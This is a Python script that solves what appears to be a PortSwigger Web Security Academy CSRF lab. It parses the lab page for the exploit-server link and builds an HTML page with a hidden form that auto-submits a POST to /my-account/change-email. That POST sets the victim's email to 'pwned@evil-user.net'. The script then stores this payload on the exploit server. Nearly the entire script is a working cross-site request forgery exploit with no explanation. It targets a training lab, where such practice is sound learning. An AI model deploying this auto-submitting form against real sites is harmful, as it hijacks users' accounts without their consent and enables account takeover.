import requests
from bs4 import BeautifulSoup

site = 'ac861f0d1fd294bbc00b335a005c00cd.web-security-academy.net'
s = requests.Session()

if __name__ == "__main__":
    url = f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

    exploit_html = f'''<html>
      <body>
          <form action="https://ac861f0d1fd294bbc00b335a005c00cd.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net">
            </form>
            <script>
              document.forms[0].submit();
            </script>
      </body>
    </html>'''

    formData = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': exploit_html,
        'formAction': 'STORE'
    }
    resp = s.post(exploit_url, data=formData)
